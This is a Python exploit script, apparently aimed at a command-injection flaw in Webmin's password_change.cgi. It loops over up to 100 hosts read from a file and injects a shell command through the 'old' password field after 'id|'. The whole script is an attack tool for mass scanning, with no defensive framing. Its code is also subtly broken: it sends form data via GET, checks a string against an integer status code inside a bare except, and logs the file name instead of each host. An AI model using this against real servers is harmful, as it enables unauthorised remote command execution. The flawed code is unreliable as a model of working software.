import requests
import sys

not_vuln = """<h1>Error - Perl execution failed</h1>
<p>Password changing is not enabled! at /usr/share/webmin/password_change.cgi line 12."""


Vulnerable_Hosts = []

def silent_trigger(ip,cmd):
    target_url = "https://"+ip+":10000/password_change.cgi"
    target_headers = {"Referer": "https://"+ip+":10000/session_login.cgi", "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    target_data = {"\r\n\r\nuser": "wheel", "pam": '', "expired": "2", "old": "id|echo\'"+cmd+"\'", "new1": "wheel", "new2": "wheel"}
    response = requests.get(target_url, headers=target_headers, data=target_data,timeout=3,verify=False)
    print(target_data)
    return response


def main():
    try:
       modifier = "-" * 20
       target = sys.argv[1]
       data = [line.strip() for line in open(target, 'r')]
       for targets in data[:100]:
          try:
             response = silent_trigger(targets,"ThisisATest")
 
             print(modifier)
             print("Status: "+str(response.status_code))
             print(modifier)
             print("Headers:")
             print(modifier)
             print(response.headers)
             print(modifier)
             print("Response Data")

             if not_vuln in response.text:
                print(modifier)
                print(response.text)

             else:
                if "200" in response.status_code:
                   local_dict = {'Target':target,'Is_Vuln':True}
                   Vulnerable_Hosts.append(local_dict)
          except:
              pass


    except:
       pass
    if Vulnerable_Hosts:
       for hosts in Vulnerable_Hosts:
           print(hosts)


main()
